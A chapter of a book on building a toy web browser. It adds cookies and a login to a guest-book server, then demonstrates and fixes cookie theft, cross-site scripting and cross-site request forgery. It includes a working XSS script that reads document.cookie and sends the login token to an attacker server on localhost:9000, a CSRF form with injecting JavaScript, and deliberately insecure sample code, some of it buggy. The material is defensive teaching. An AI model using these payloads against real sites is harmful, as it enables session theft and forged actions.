title: Keeping Data Private

Our browser has grown up and now runs (small) web applications. Let's
take the final step and add user identity to our browser via cookies.
Capability demands responsibility: our browser must then secure
cookies against adversaries interested in getting at them.

::: {.warning}
Web browser security is a vast topic. It involves securing the web
browser, securing the network, and securing the applications that the
browser runs. It also involves educating the user, so that attackers
can't misleading them into revealing their own secure data. This chapter
can't cover all of that. Instead, it focuses on the mechanisms browsers
have developed to protect the security of web applications. *So*, if
you're writing security-sensitive code, this book is not enough.
:::

Cookies
=======

The most basic kind of user data on the web is the *cookie*. A
cookie---the name is meaningless, ignore it---is a little bit of
information stored by your browser on behalf of a web server. It's
that information that allows the server to distinguish one web request
from another. Bereft of cookies, your web browser is effectively
anonymous:[^1] it isn't logged in anywhere so it can't do any useful
personalization or show you your private data.

[^1]: I don't mean anonymous against malicious attackers, who might
    use *browser fingerprinting* or similar techniques to tell users
    apart. I mean anonymous in the good-faith sense.


Here's how cookies work. A web server, when it sends you an HTTP
response, can add a `Set-Cookie` header. This header contains a
key-value pair, plus a bunch of parameters describing how long the
cookie should be stored and who it should be shown to. For example,
the following `Set-Cookie` header sets the value of the `foo` key to
`bar` and saves it until 2020:

    Set-Cookie: foo=bar; expires=Wed, 1 Jan 2020 00:00:00 GMT

The expiration date is not mandatory, and there are other parameters
you could add to a cookie; for now let's focus just on the key-value
pair involved. That's what your browser needs to remember: that `foo`
is `bar`. Every time it visits the server again it tells the server
that `foo=bar` using the `Cookie` header:

    Cookie: foo=bar

Parameters like expiration dates are not reported to the server.
If the browser is storing multiple cookies for that server, it
combines the key-value pairs with a semicolon.

Let's implement cookies. We'll start storing cookies in our `Browser`;
that database is traditionally called a *cookie jar*[^2] but I'll
just call it `cookies`:

[^2]: Because once you have one silly name it's important to stay
    on-brand.

``` {.python}
class Tab:
    def __init__(self):
        # ...
        self.cookies = {}
```

Then, when responses are processed:

``` {.python expected=False}
def load(self, url, body=None):
    # ...
    if "set-cookie" in headers:
        if ";" in headers["set-cookie"]:
            kv, params = headers["set-cookie"].split(";", 1)
        else:
            kv = headers["set-cookie"]
        self.cookies[key] = value
    # ...
```

For now this code ignores expiration and all the other parameters, and
it also ignores the fact that a server can actually send multiple
`Set-Cookie` headers to set multiple cookies. It's a toy browser,
people! I'm also storing all the cookies, from all of the servers, in
one place. This is *not* a good idea, and we'll fix it later! For now,
think of this as a one-server browser.

::: {.todo}
I've soured on this straw-man of implementing an insecure feature only
to secure it later.
:::

Finally, we need to send the `Cookie` header with all of the current
cookies. Let's add a `headers` argument to the `request` function so
we can pass in the value of the `Cookie` header:

``` {.python}
def request(url, headers={}, payload=None):
    # ...
    for header, value in headers.items():
        body += "{}: {}\r\n".format(header, value)
    # ...
```

Now before calling `request` in `load`, let's construct the cookie
string:

``` {.python expected=False}
class Browser:
    def cookie_string(self):
        cookie_string = ""
        for key, value in self.cookies.items():
            cookie_string += "&" + key + "=" + value
        return cookie_string[1:]
    
    def load(self, url, body=None):
        req_headers = { "Cookie": self.cookie_string() }
        # ...
        headers, body = request(url, headers=req_headers, payload=body)
```

Note that `load` calls `request` three times (for the HTML, CSS, and
JS files). All of them should pass in that `Cookie` header.

Before we continue improving our cookie implementation, let's use them
to add logins to the guest book server.

A login system
==============

I want users to log in before posting to the guest book. Nothing
complex, just the minimal functionality:

-   Users have to be logged in to add guest book entries.
-   The server will display who added which guest book entry.
-   Users will log in with a username and password on the `/login` page.
-   The server will hard-code a set of valid logins.

Let's start coding. First, we'll need to store usernames in `ENTRIES`:[^3]

[^3]: The seed comments reference 1995's *Hackers*.
    [Hack the Planet!](https://xkcd.com/1337)


``` {.python .browser expected=False}
ENTRIES = [
    ("No names. We are nameless!", "cerealkiller"),
    ("HACK THE PLANET!!!", "crashoverride"),
]
```


When we print the guest book entries, print the username as well:

``` {.python .browser expected=False}
for entry, who in ENTRIES:
    out += '<p>' + entry + " <i>from " + who + '</i></p>'
```

We'll also need a data structure to store usernames and passwords:

``` {.python .browser expected=False}
LOGINS = { "crashoverride": "0cool", "cerealkiller": "emmanuel" }
```

Next, let's add the `/login` URL:

``` {.python expected=False}
def handle_request(method, url, headers, body):
    if method == 'POST':
        # ...
    else:
        # ...
        elif url == "/login":
            return login_form()

def login_form():
    body = "<!doctype html>"
    body += "<form action=/ method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body
```

To use the form, the user goes to `/login`, fills out their
details,[^4] and submits the form. The login is sent to the main page
(thanks to "`action=/`"), which needs to handle the request. I'll
implement the login logic directly in `handle_request`:

[^4]: I've given the `password` input area the type `password`, which
    in a real browser will draw stars or dots instead of showing what
    you've entered, though our browser doesn't do that.

``` {.python expected=False}
def handle_request(method, url, headers, body):
    username = None
    if method == 'POST' and url == "/":
        params = form_decode(body)
        if check_login(params.get("username"), params.get("password")):
            username = params["username"]
    # ...
```

The `check_login` method does exactly what you'd expect:

``` {.python expected=False}
def check_login(username, pw):
    return username in LOGINS and LOGINS[username] == pw
```

The server now checks that the login was correct, but it should also set
a cookie so that the browser actually remembers the login:[^5]

[^5]: Like with the cookie jar, this is a transparently insecure design,
    on purpose, so that I can demonstrate an attack.

``` {.python expected=False}
def handle_request(method, url, headers, body):
    resp_headers = {}
    
    if method == "post" and url = "/":
        # ...
        if check_login(params.get("username"), params.get("password")):
            # ...
            resp_headers["Set-Cookie"] = "username=" + username
    # ...
```

We'll need to send those headers in `handle_connection`, so first
modify `handle_request` to return `resp_headers` in each case (there
are lots!). Then, modify `handle_connection` to use them:

``` {.python expected=False}
def handle_connection(conx):
    # ...
    body, headers = handle_request(method, url, headers, body)
    response = "HTTP/1.0 200 OK"
    for header, value in headers.items():
        response += "{}: {}\r\n".format(header, value)
    # ...
```

Since we're now setting cookies we should also be reading them:[^6]

[^6]: In reality there's also special syntax if you want an equal sign
    in your cookie, but I'm ignoring that.

``` {.python expected=False}
def parse_cookies(s):
    out = {}
    for cookie in s.split("&"):
        k, v = cookie.strip().split("=", 1)
        out[k] = v
    return out
```

That allows us to automatically log in users with the login cookie:

``` {.python expected=False}
def handle_request(method, url, headers, body):
    resp_headers = {}
    if method == "POST" and url = "/":
        # ...
    elif "cookie" in headers:
        username = parse_cookies(headers["cookie"]).get("username")
```

That will log a user in if they have the right cookie. Now we need to
make some changes to the existing guest book code to handle logins.

We can pass `username` to `show_comments` and use it to either send
the user the input form or to give them a login link:

``` {.python expected=False}
def show_comments(username):
    # ...
    if username:
        # ...
    else:
        out += "<p><a href=/login>Log in to add to the guest list</a></p>"
    # ...
```

When you post to the guest book, we'll also need to know your
username:

``` {.python expected=False}
def add_entry(params, username):
    if 'guest' in params and len(params['guest']) <= 100 and username:
        ENTRIES.append((params['guest'], username))
```

We aren't showing the new guest book entry form to users who aren't
logged in, but we still need to check `username` here, for the same
reason that we need to check the length of entries on both the client
and the server side: malicious users could construct their own POST
requests instead of filling out the form in a browser.

Try it out! You should be able to go to the main guest book page,
click the link to log in, use one of the username/password pairs
above, and post entries.^[The login flow slows down debugging. You
might want to add the empty string as a username/password pair.]

Of course, the code above has a whole slew of insecurities. It's hard
to cover all of them,[^7] but let's cover three of the most glaring
ones.

[^7]: I should be hashing passwords! Using `bcrypt`! We should verify
    email addresses! Over TLS! We should be comparing passwords in a
    constant-time fashion!

Changing your login
===================

Right now, the cookie just stores your username. It's not hard to
change! Let's go back to our browser and hard-code the cookie value:

``` {.python expected=False}
self.cookies["username"] = "nameless"
```

Now if you start up your browser and point it at the main page, you
should see the entry form, even though you never had to enter a
login.[^real-too] How absurdly insecure!

[^real-too]: You don't need a custom browser to do this. In a real
    browser, popping open the developer console and changing
    `document.cookie` is enough.

The solution to this is to not store the username directly in the
browser, where it can be changed by the user. Instead, let's store a
"login token", a random value that is hard to guess, and have the
server remember which login token is for which username.

This is actually standard practice not just for security reasons but
also for functional ones. Cookie names and values should be pretty
short.[^8] So cookies don't usually store *data*; they store
*references* to data on the server, which can be as big as you want.

[^8]: Cookies are sent back and forth on every request, so long
    cookies mean a lot of useless traffic. Plus, browsers and servers
    both limit header lengths, though there isn't a uniform limit.


Let's add login tokens in our guest book. I'll store the tokens in a
global variable:

``` {.python expected=False}
import random
TOKENS = {}
```

Then where we set `Set-Cookie` we'll create a new token and remember
its username:

``` {.python expected=False}
def handle_request(method, url, headers, body):
    # ...
    token = str(random.random())[2:]
    TOKENS[token] = username
    headers["Set-Cookie"] = "token=" + token
    # ...
```

Then when we read the `Cookie` header, we'll use the token to retrieve
the username:

``` {.python expected=False}
def handle_request(method, url, headers, body):
    # ...
    elif "cookie" in headers:
        username = TOKENS.get(parse_cookies(headers["cookie"]).get("token"))
    # ...
```

As long as the tokens are hard to guess,[^9] the only way to get one is
from the server, and the server will only give you one with a valid
login.

[^9]: They're roughly-16-digit decimal numbers, so they have 53 bits
    of randomness, which isn't great--- go for 256. Plus,
    `random.random` is not a secure random number generator: observing
    enough tokens, could allow you to predict future values and use
    those to hijack accounts. That's not one of the security exploits
    I'll fix in this chapter, but it is real and important.


The same-origin policy
======================

Our browser does not keep our precious cookie safe. Right now, we have a
single cookie jar in our browser, and every cookie from any website is
sent to all other websites. This means that if you log in on our guest
book, and then make a request to the `attack.evil` website, that website
can see the token in the headers, record it, set its own browser cookie
to your token, and then post as you on the guest book website. You see,
cookies are web-site specific, but we're not storing them that way. It
goes beyond security---if you have two servers that both set the `token`
cookie, they'd overwrite each other and you'd constantly be getting
logged out!

<a name="same-origin-policy">

Web browsers use the *same origin policy* to determine which cookies
are sent where. The rule is: a cookie is only sent in HTTP requests to
the same origin---where the origin is the scheme, host, and
port---where it was set. Let's update our cookie policy to do this.
I'll change the `cookies` field so it stores a map from origins to
key-value pairs:

``` {.python indent=4}
def load(self, url, body=None):
    # ...
    if "set-cookie" in headers:
        # ...
        origin = url_origin(self.history[-1])
        self.cookies.setdefault(origin, {})[key] = value
```

Then, in `cookie_string` instead of iterating over all cookies we'll
do:

``` {.python expected=False}
def cookie_string(self):
    cookie_string = ""
    origin = url_origin(self.history[-1])
    for key, value in self.cookies.get((host, port), {}).items():
        # ...
```

In both functions, `url_origin` just extracts the scheme, host, and
port for a URL:

``` {.python}
def url_origin(url):
    return "/".join(url.split("/")[:3])
```

Now it's not quite so easy for a rogue web server to steal our cookies.
It'd have to be on the same origin, and that can't happen, because
this origin is already occupied up by *this* server.

Right?

Cross-site scripting
====================

Sure, the origin is uniquely owned by our web server, so there's no way
some other web server could see the headers the server and browser send
to each other.[^11][^12][^13][^14]

But that's not the only way to read cookies! In fact, cookies are
accessible from JavaScript as well, through the `document.cookie` field.
This field is a string, containing the same contents as the `Cookie`
header value. We can implement that pretty simply. First, in
`runtime.js`:

``` {.javascript}
Object.defineProperty(document, 'cookie', {
    get: function() { return call_python("cookie"); }
})
```

Now we register `cookie` to a simple function that returns the cookie
value:

``` {.python}
class JSContext:
    def __init__(self, tab):
        # ...
        self.interp.export_function("cookie", self.cookie_string)
        # ...
```

Accessing cookies from JavaScript may seem benign, since the
JavaScript being run, in `comment.js`, is our own and won't do
anything malicious. And this is true, if our users cooperate. But web
services sometimes turn into battlegrounds between users. And consider
the code we wrote to output guest book entries:

``` {.python expected=False}
out += '<p>' + entry + ' <i> from ' + who + '</i></p>'
```

Note that `entry` can be anything, anything the user might stick into
our comment form. "Anything" might even include a user-written
`<script>` tag! Let's imagine that you're logged in as one user, maybe
`crashoverride`, but would like to gain access to another username,
maybe `nameless`. You could post the comment:

``` {.example}
Hi! <script src=http://my-server/evil.js></script>
```

Our server would then output the HTML:[^15]

[^15]: A real browser would use form-encoding to transmit all of these
    special characters. Our browser's form-encoding is very limited,
    but this comment does go through.

``` {.example}
<p>Hi! <script src=http://my-server/evil.js></script>
<i> by crashoverride</i></p>
```

That would cause our browser to download the `evil.js` script.[^16] So
`evil.js` could access `document.cookie` and do something evil.

[^16]: Yes: real browsers, just like our toy browser, will download
    and run JavaScript from any source, including from other servers
    and origins, and they all run with the same permissions. This is
    how JavaScript libraries usually work!

Let's try it out. Post the above comment, except instead of
`my-server` use `localhost:9000`, where we'll create a server with:

``` {.example}
python3 -m http.server 9000
```

That runs Python's built-in HTTP server on port 9000; it'll respond to
`localhost:9000/<file>` with the contents of `<file>` in the current
directory. Let's fill `evil.js` with the following contents:

``` {.javascript}
token = document.cookie.split("=")[1]
body = document.querySelectorAll("body")[0]
url = "http://localhost:9000/" + token
body.innerHTML = "<a href=" + url + ">Click to continue</a>"
```

That replaces the whole web page with a single link. When the user
clicks that link,[^17] their browser sends the evil web server the
token value, embedded in the request URL. Our evil server records
that, and the game is up! In a more feature-full browser, the link
could be hidden. The attacker could make an `XMLHttpRequest`,[^18] add
an image to the page that the browser will try to load (from our evil
server), load JavaScript from our evil domain, or anything else like
that. Even with the extremely limited DOM API our browser supports, we
could better hide our evildoing:

[^17]: You've seen "please click to continue" screens and have clicked
    the button unthinkingly. Your users will too.

[^18]: Scripts aren't allowed to read data from XHRs to another
    origin, but the browser still makes the request.


``` {.javascript}
form = document.querySelectorAll("form")
url = "http://localhost:9000/" + token
newform = "<form action=" + url + " method=get>"
newform += "<p><input name=guest></p>"
newform += "<p><button>Sign the book!</button></p>"
newform += "</form>"
form.innerHTML= newform
```

This replaces the contents of the comment form with a new form (so it's
a form in a form, with the inner form taking priority) that submits both
the new comments and the login token to our evil server.

Try these exploits out, both in our toy browser and in a real one.

The core problem behind these problems is that user comments are
supposed to be data, but the browser is interpreting them as code. This
kind of exploit is usually called *cross-site scripting*, shortened to
XSS, though the data-misinterpreted-as-code issue is a fairly broad one
that occurs in many, many systems.

Anyway, whatever it's called, we need to fix it, and the way we do that
is not sending `entry`, the user comment, directly to the browser.
Instead, we'd do something to ensure the browser would not interpret it
as code, something like:

``` {.python expected=False}
def html_escape(text):
    return text.replace("&", "&amp;").replace("<", "&lt;")

def show_comments(username):
    # ...
    out += "<p>" + html_escape(entry)
    out += " <i>from " + html_escape(who) + "</i></p>"
    # ...
```

Now the comment would would be printed as the code `&lt;script`,
instead of as a literal script tag, so the browser will interpret it
as text, not a tag,[^19] and won't run any code inside. Success! Most
languages that you might write a web server in come with helper
functions to do this escaping for you.[^python-html]

[^python-html]: In Python, use the `html` module's `escape` method. In
    JavaScript, use `textContent` instead of `innerHTML` when you
    don't intend to add HTML content.

I should add that there are other approaches to this bug. You could
remove tags instead of escaping the angle bracket. You could prevent
users from submitting comments with "invalid characters". You could do
the character replacing before saving the entry, instead of before
showing the entry. These are all worse than escaping:

-   Removing tags means implementing the quirky HTML parsing algorithm.
-   Preventing comments with tags has the same issue, and you need to
    do the same check on the server and the client side. Plus, you
    might write too tight a filter and prevent users from sending
    something benign, like old-school heart emoticons `<3`.
-   Saving the character-replaced entry assumes you'll only consume
    the entry in HTML. Your server might later want to use that data
    in [JSON](https://www.json.org/) (you'll need to escape single quotes), or raw JavaScript
    (you'll need to escape `</script>`), or JSON embedded in
    JavaScript embedded in HTML. Data should be a single source of
    truth, not a place to store mangled HTML.

You might want to escape some more characters, like replacing double
quotes with `&quot;` if you plan to stick user data into HTML
attributes, but the method above is roughly correct in general concept.

Cross-site request forgery
==========================

Thanks to the same-origin policy and the mitigations for cross-site
scripting, it's now hard for an evil-doer to steal the login token
from our browser. But that doesn't leave us totally safe. Another
concern is our browser misusing the token. One popular exploit of this
type is called *cross-site request forgery*, often shortened to CSRF.

In cross-site request forgery, the attack does not involve the user
going to our guest book site at all. Instead, the user begins on our
evil-doer's website.[^20] That website has a form analogous to the
guest-book form:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

Our browser (and a real one) does not care what origin a form is on:
you can submit a form on one origin to another origin, and this
ability is widely used for some reason.[^21] So even if the user fills
out this form on the evil website, the form is still submitted to
the guest-book. When the browser makes that POST request to the
guest-book, it will *also* send along its guest-book cookie. Since the
user has no idea where a form is going---the browser does not show
them that information---they might want to sign a guest book on the
evil-doer's site and end up signing the one on our server
instead.^[And thank goodness we never implemented a change-of-password
form!]

But it gets worse! Suppose the form isn't actually like that, and
instead looks like this:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><button>Click me!</button></p>
</form>
```

People will do all sorts of stuff, so they might click that
button.[^you-too] And it may look safe, since there's no `guest` input
area. However, there might be some sneaky JavaScript attached:

[^you-too]: You have clicked similar buttons. Admit it.

``` {.javascript}
form  = document.querySelectorAll('form')[0]
form.addEventListener("submit", function() {
    comment = "Buy from my website: http://evil.doer/";
    input = "<input name=guest value=\"" + comment + "\">";
    form.innerHTML = input;
})
```

This script waits for the user to click the button, and then replaces
the form contents with a `guest` input area with a pre-filled value.
The browser then finds it when it looks for input areas and submits
our hard-coded guest-book entry to the guest-book server. And
remember: the form is submitted by the user's browser, with the user's
cookies, so the post will succeed (if the user is logged in to the
guest book). Posting a comment this way is not too scary (though shady
advertisers will pay for it!) but posting a bank transaction is.

Try it! This should work in both ours and in a real browser. Plus, in a
real browser you could also have a "hidden" input element, which would
mean that you don't need to write any tricky JavaScript at all.

How do we defend against this attack?

We want to make sure that every POST request to `/add` comes from a form
on our website. The normal way to ensure that is to embed a secret
value, called a *nonce*, into the form, and to reject form submissions
that don't come with this secret value.

A nonce is like a login token, but instead of getting it on login, you
get a new one every time you're presented with a form to fill out. In
some sense, it's like a cookie, except that it's stored inside the
HTML and thus lasts for just one request (instead of across many
requests to the same server), so it can't be misused in the same way.

Let's implement nonces in our guest book. Generate a secret nonce and
add it to the form:

``` {.python expected=False}
def show_comments(username):
    # ...
    if username:
        nonce = str(random.random())[2:]
        out += "<form action=add method=post>"
        out +=   "<p><input name=nonce type=hidden value=" + nonce + "></p>"
        # ...
```

The `hidden` input type basically instructs a browser not to render the
input area, but to still submit it in the form. In our browser, which
doesn't support hidden input elements, this will show up as an input
area with a random string of digits---not ideal, but as long as you
don't touch it form submission will work fine.

We'll also need to save the nonce so that we can tell valid from
invalid nonces. I'm going to store that in a `NONCES` variable, which
will store one nonce per user. We'll then check both that the nonce is
valid and also that it is associated with the correct user:[^22]

[^22]: Otherwise an attacker could get a nonce for *their* account and
    then use in a CSRF attack for another user's submission.

``` {.python expected=False}
def show_comments(username):
    # ...
    if username:
        nonce = str(random.random())[2:]
        NONCES[username] = nonce
```

When the form is submitted, we will check the nonce:

``` {.python expected=False}
def add_entry(params, username):
    if not check_nonce(params, username):
        return "Invalid nonce", {}
    # ...

def check_nonce(params, username):
    if 'nonce' not in params: return False
    if username not in NONCES: return False
    return params['nonce'] == NONCES[username]
```

Thanks to this change, in order to add an entry to the guest book, you
need to be logged in and submit the form on the guest book page itself.
And that's a form that we, as the guest book authors, have sole control
over (thanks to our XSS mitigations), so the form submission has now
been secured. Or... I keep saying there's more to security than what's
in this book. Let's just settle for this fact: the guest book is now
more secure than before.

::: {.warning}
The purpose of this book is to teach the *internals of web browsers*,
not to teach web application security. There's much more you'd want
to do to make this guest book truly secure, let alone what we'd need
to do to avoid denial of service attacks or to handle spam and
malicious use.

Summary
=======

We've added user data, in the form of cookies, to our browser, and
immediately had to bear the heavy burden of securing that data and
ensuring it was not misused. We then saw the rich browser features we
developed turn into attack vector. And we've made with some simple
tweaks to our guest book to prevent two common web application
vulnerabilities.

Exercises
=========

*Hidden input*: Add support for hidden input elements. Since they
don't need to be laid out, there's no need for a layout type at all!

*Cookie Expiration*: Add support for cookie expiration. Cookie
expiration dates are set in the `Set-Cookie` header, and can be
overwritten if the same cookie is set again with a later date. Save
the same expiration dates in the `TOKENS` variable and use it to
delete old tokens to save memory.

*Cookie Origins*: Add support for cookie origins. Due to the
same-origin policy, a cookie set by `mail.google.com` cannot be read
by, say, `calendar.google.com`, because the host name is the same.
This is a good default,[^23] but is sometimes annoying. A server can
set an `origin` parameter in the `Set-Cookie` header to strip off some
subdomains from the cookie origin. Implement this in your browser,
making sure to send these generalized-origin cookies on any requests
covered by the generalized origin.

*Content Security Policy*: The `Content-Security-Policy` header is a
powerful tool in modern browsers to prevent XSS attacks. The full
specification is quite complex, but in the simplest case, the header
is set to the keyword `default-src` followed by a space-separated list
of origins. That instructs the browser to refuse to load any resources
for that page (CSS, JavaScript, images, and so on) except from those
origins. Implement support for this header.

*Referer*: When your browser visits a web page, or when it loads a CSS
or JavaScript file, it sends a `Referer` header[^24] containing the
URL it is coming from. Sites often use this for analytics. Implement
this in your browser. However, some URLs contain personal data that
they don't want revealed to other websites, so browsers support a
`Referer-Policy` header, which can contain values like `no-referer`
(never send the `Referer` header when leaving this page) or
`same-origin` (only do so if navigating to another page on the same
origin). Implement those two values for `Referer-Policy`.

[^11]: Well... Our connection isn't encrypted, so an attacker could
    pick up the token from there. But another *server* couldn't.

[^12]: Well... Another server could hijack our DNS and redirect our
    hostname to a different IP address, and then steal our cookies. But
    some ISPs support DNSSEC, which prevents that.

[^13]: Well... A state-level attacker could announce fradulent BGP
    routes, which would send even a correctly-retrieved IP address to
    the wrong physical computer.

[^14]: Security is very hard.

[^19]: In a real browser, that code will be displayed as a literal
    less-than sign followed by the word `script`, but in our browser,
    this won't happen, unless you did the relevant exercise in [Chapter
    4](html.md).

[^20]: Why is the user on the attacker's site? Perhaps it has funny
    memes, or it's been hacked and is being used for the attack
    against its will, or perhaps the evil-doer paid for ads on sketchy
    websites where users have low standards for security anyway.

[^21]: For example, search forms that actually just direct you to a
    Google search.

[^23]: Should `microsoft.com` read `google.com`? What about
    `microsoft.co.uk` and `google.co.uk`?

[^24]: Yep, spelled that way.
